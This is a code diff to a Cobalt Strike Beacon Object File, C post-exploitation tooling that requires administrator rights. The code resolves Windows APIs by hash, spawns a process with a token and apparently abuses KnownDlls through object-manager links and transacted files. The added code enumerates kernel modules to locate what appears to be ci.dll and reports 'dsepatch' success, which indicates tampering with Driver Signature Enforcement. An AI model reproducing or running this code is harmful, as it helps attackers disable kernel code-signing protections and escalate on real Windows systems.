@@ -24,58 +24,64 @@
 
 D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
 	if ( BeaconApi->BeaconIsAdmin( ) ) {
-		if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion >= 6 ) {
-			if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 3 || NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 0 ) {
+		if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion == 6 ) {
+			if ( NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion != 3 ) {
 				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "Does not support anything older than Windows 8.1" ) ) );
 				return;
 			};
 		};
 
-		INT			NamLen = 0;
-		INT			DllLen = 0;
-		ULONG			PidNum = 0;
+		INT				LenInf = 0;
+		INT				NamLen = 0;
+		INT				DllLen = 0;
+		ULONG				PidNum = 0;
 
-		HANDLE			SysTok = NULL;
-		HANDLE			LclTok = NULL;
+		PCHAR				ModStr = NULL;
 
-		LPWSTR			DllNam = NULL;
-		LPWSTR			LnkNam = NULL;
-		LPWSTR			RegNam = NULL;
-		LPVOID			DllBuf = NULL;
+		HANDLE				SysTok = NULL;
+		HANDLE				LclTok = NULL;
 
-		LPWSTR			KwnPth = NULL;
-		LPWSTR			LnkPth = NULL;
-		LPWSTR			GblPth = NULL;
-		LPWSTR			ObjPth = NULL;
-		LPWSTR			DskPth = NULL;
-		LPWSTR			RegPth = NULL;
+		LPWSTR				DllNam = NULL;
+		LPWSTR				LnkNam = NULL;
+		LPWSTR				RegNam = NULL;
+		LPVOID				DllBuf = NULL;
 
-		HANDLE			DirObj = NULL;
-		HANDLE			LnkObj = NULL;
-		HANDLE			LnkTwo = NULL;
-		HANDLE			MgrPtr = NULL;
-		HANDLE			FlePtr = NULL;
-		HANDLE			SecPtr = NULL;
-		HANDLE			DupUsr = NULL;
+		LPWSTR				KwnPth = NULL;
+		LPWSTR				LnkPth = NULL;
+		LPWSTR				GblPth = NULL;
+		LPWSTR				ObjPth = NULL;
+		LPWSTR				DskPth = NULL;
+		LPWSTR				RegPth = NULL;
 
-		PIMAGE_DOS_HEADER	DosHdr = NULL;
-		PIMAGE_NT_HEADERS	NthHdr = NULL;
-		PIMAGE_SECTION_HEADER	SecHdr = NULL;
+		HANDLE				DirObj = NULL;
+		HANDLE				LnkObj = NULL;
+		HANDLE				LnkTwo = NULL;
+		HANDLE				MgrPtr = NULL;
+		HANDLE				FlePtr = NULL;
+		HANDLE				SecPtr = NULL;
+		HANDLE				DupUsr = NULL;
 
-		HKEY			RegKey = NULL;
+		PIMAGE_DOS_HEADER		DosHdr = NULL;
+		PIMAGE_NT_HEADERS		NthHdr = NULL;
+		PIMAGE_SECTION_HEADER		SecHdr = NULL;
 
-		PVOID			NtlMod = NULL;
-		PVOID			K32Mod = NULL;
-		PVOID			AdvMod = NULL;
+		PSYSTEM_MODULE_INFORMATION	ModInf = NULL;
 
-		API			ApiTbl;
-		DATAP			Parser;
-		STARTUPINFOW		StartW;
-		UNICODE_STRING		UniOne;
-		UNICODE_STRING		UniTwo;
-		OBJECT_ATTRIBUTES	ObjAtt;
-		PROCESS_INFORMATION	ProcIn;
-		SECURITY_DESCRIPTOR	SecDes;
+		HKEY				RegKey = NULL;
+
+		PVOID				NtlMod = NULL;
+		PVOID				K32Mod = NULL;
+		PVOID				AdvMod = NULL;
+
+		API				ApiTbl;
+		DATAP				Parser;
+		STARTUPINFOW			StartW;
+		UNICODE_STRING			UniOne;
+		UNICODE_STRING			UniTwo;
+		IMAGE_DOS_HEADER		ModHdr;
+		OBJECT_ATTRIBUTES		ObjAtt;
+		PROCESS_INFORMATION		ProcIn;
+		SECURITY_DESCRIPTOR		SecDes;
 
 		RtlSecureZeroMemory( &ApiTbl, sizeof( ApiTbl ) );
 		RtlSecureZeroMemory( &Parser, sizeof( Parser ) );
@@ -96,13 +102,16 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.RtlAnsiStringToUnicodeSize   = PeGetFuncEat( NtlMod, H_API_RTLANSISTRINGTOUNICODESIZE );
 		ApiTbl.SetSecurityDescriptorDacl    = PeGetFuncEat( AdvMod, H_API_SETSECURITYDESCRIPTORDACL );
 		ApiTbl.NtCreateDirectoryObjectEx    = PeGetFuncEat( NtlMod, H_API_NTCREATEDIRECTORYOBJECTEX );
+		ApiTbl.NtQuerySystemInformation     = PeGetFuncEat( NtlMod, H_API_NTQUERYSYSTEMINFORMATION );
 		ApiTbl.SetKernelObjectSecurity      = PeGetFuncEat( AdvMod, H_API_SETKERNELOBJECTSECURITY );
 		ApiTbl.NtQueryInformationToken      = PeGetFuncEat( NtlMod, H_API_NTQUERYINFORMATIONTOKEN );
 		ApiTbl.CreateProcessWithTokenW      = PeGetFuncEat( AdvMod, H_API_CREATEPROCESSWITHTOKENW );
 		ApiTbl.ConvertStringSidToSidA       = PeGetFuncEat( AdvMod, H_API_CONVERTSTRINGSIDTOSIDA );
 		ApiTbl.CreateFileTransactedW        = PeGetFuncEat( K32Mod, H_API_CREATEFILETRANSACTEDW );
+		ApiTbl.NtWaitForSingleObject        = PeGetFuncEat( NtlMod, H_API_NTWAITFORSINGLEOBJECT );
 		ApiTbl.RtlInitUnicodeString         = PeGetFuncEat( NtlMod, H_API_RTLINITUNICODESTRING );
 		ApiTbl.NtCreateTransaction          = PeGetFuncEat( NtlMod, H_API_NTCREATETRANSACTION );
+		ApiTbl.NtReadVirtualMemory          = PeGetFuncEat( NtlMod, H_API_NTREADVIRTUALMEMORY );
 		ApiTbl.NtOpenProcessToken           = PeGetFuncEat( NtlMod, H_API_NTOPENPROCESSTOKEN );
 		ApiTbl.RtlInitAnsiString            = PeGetFuncEat( NtlMod, H_API_RTLINITANSISTRING );
 		ApiTbl.IsTokenRestricted            = PeGetFuncEat( AdvMod, H_API_ISTOKENRESTRICTED );
@@ -295,11 +304,42 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 								&ProcIn
 						) )
 						{
-							ApiTbl.Sleep( 5000 );
-							ApiTbl.NtClose( ProcIn.hProcess );
-							ApiTbl.NtClose( ProcIn.hThread );
+							if ( ! ApiTbl.NtWaitForSingleObject( ProcIn.hThread, FALSE, NULL ) ) {
+								if ( !( ApiTbl.NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &LenInf ) ) ) {
+									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get length of module info." ) ) );
+									goto Leave;
+								};
+								if ( !( ModInf = ApiTbl.LocalAlloc( LPTR, LenInf ) ) ) {
+									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
+									goto Leave;
+								};
+								if ( !( ApiTbl.NtQuerySystemInformation( SystemModuleInformation, ModInf, LenInf, &LenInf ) >= 0 ) ) {
+									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read module information." ) ) );
+								};
+								for ( INT Idx = 0 ; Idx < ModInf->Count ; ++Idx ) {
+									ModStr = C_PTR( U_PTR( ModInf->Module[ Idx ].FullPathName ) + ModInf->Module[ Idx ].OffsetToFileName );
+
+									if ( HashString( ModStr, 0 ) == H_STR_CI ) {
+										if ( ! ApiTbl.NtReadVirtualMemory( 
+													( ( HANDLE ) - 1 ), 
+													ModInf->Module[ Idx ].ImageBase, 
+													&ModHdr, 
+													sizeof( ModHdr ), 
+													NULL
+										) )
+										{
+											BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "dsepatch: success" ) ) );
+										} else {
+											BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "dsepatch: failure" ) ) );
+										};
+									};
+								};
+							} else {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "wait was aborted unexpectedly." ) ) );
+								goto Leave;
+							};
 						} else {
-							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( ":(" ) ) );
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not spawn a protected process." ) ) );
 							goto Leave;
 						}
 					} else {
@@ -343,6 +383,12 @@ Leave:
 		if ( SecPtr != NULL ) {
 			ApiTbl.NtClose( SecPtr );
 		};
+		if ( ProcIn.hProcess != NULL ) {
+			ApiTbl.NtClose( ProcIn.hProcess );
+		};
+		if ( ProcIn.hThread != NULL ) {
+			ApiTbl.NtClose( ProcIn.hThread );
+		};
 		if ( RegKey != NULL ) {
 			/* RegCloseKey */
 		};
@@ -366,6 +412,9 @@ Leave:
 		};
 		if ( RegPth != NULL ) {
 			ApiTbl.LocalFree( RegPth );
+		};
+		if ( ModInf != NULL ) {
+			ApiTbl.LocalFree( ModInf );
 		};
 	} else { 
 		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "beacon is not running as an administrative user." ) ) );
